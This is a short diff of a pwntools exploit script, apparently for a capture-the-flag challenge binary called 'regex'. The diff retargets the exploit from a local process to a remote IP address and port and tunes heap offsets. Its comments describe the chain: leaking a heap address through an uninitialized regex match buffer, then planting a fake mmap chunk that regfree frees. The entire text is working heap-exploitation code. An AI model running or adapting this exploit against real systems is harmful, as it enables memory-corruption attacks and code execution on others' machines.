@@ -5,7 +5,8 @@ from pwn import *
 e = ELF('./regex')
 libc = ELF('./libcs-2.31.so')
 
-p = process(e.path)
+#p = process(e.path)
+p = remote('159.89.254.233', 31785)
 
 #funcs
 
@@ -48,7 +49,7 @@ inp(0x48, b'[z-a]')
 
 #leak heap by changing preg->buffer so regexec return then pmatch uninitialized
 
-heap = mstr(0x48, 0x48) - 0x1af0
+heap = mstr(0x48, 0x48) - 0x1af0 + 0x1000 - 0x400
 
 log.info('Heap adr: ' + hex(heap))
 
@@ -63,7 +64,7 @@ log.info('Libc off adr: ' + hex(libc_off))
 #init fake mmap chnk
 
 mstr(0x100, 0x48, b'\x00')
-mstr(0x1108, 0x48, b'\x00' * 0xfe0 + p64(0) + p64((libc_off - heap - 0x3000 + 0xb000) | 2) + p64(0))
+mstr(0x2108, 0x48, b'\x00' * (0xfe0 - 0x400 + 0x1000) + p64(0) + p64((libc_off - heap - 0x3000 + 0xb000) | 2) + p64(0))
 
 #point preg->buffer to fake mmap chnk to free during regfree
 
